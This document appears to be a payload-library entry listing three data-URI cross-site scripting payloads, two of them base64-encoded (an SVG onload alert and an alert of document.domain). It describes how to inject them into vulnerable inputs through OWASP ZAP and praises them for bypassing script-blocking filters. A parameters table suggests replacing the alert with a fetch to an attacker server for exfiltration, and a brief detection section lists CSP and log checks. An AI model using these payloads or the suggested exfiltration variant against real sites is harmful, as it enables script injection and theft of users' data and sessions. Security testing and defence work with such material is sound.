---
type: code
language: javascript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
  - Browser
tags:
  - xss
  - data-uri
  - injection
validated: true
---

# data-uri-xss-payloads

## Code

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

## Description

These payloads use Data URIs to embed and execute HTML with scripts, either directly or base64-encoded. The first is plain text HTML triggering an alert; the second uses an SVG onload event; the third loads a base64 script src for domain alerting.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | No variables; customize the alert content for exfiltration (e.g., replace alert(0) with fetch to attacker server) | alert(document.domain) |

## Usage

Set as src for img, iframe, or script tags in vulnerable inputs. Intercepted via OWASP ZAP and injected; execution confirms via alert. Ideal for bypassing script-blocking filters in resource contexts.

## Detection

- CSP blocking data: URIs or base64 script sources.
- Network logs showing unusual data URI loads.
- Browser dev tools revealing embedded scripts in resources.

## Related

- [[procedures/xss-injection-via-javascript-data-uri-vbscript]]
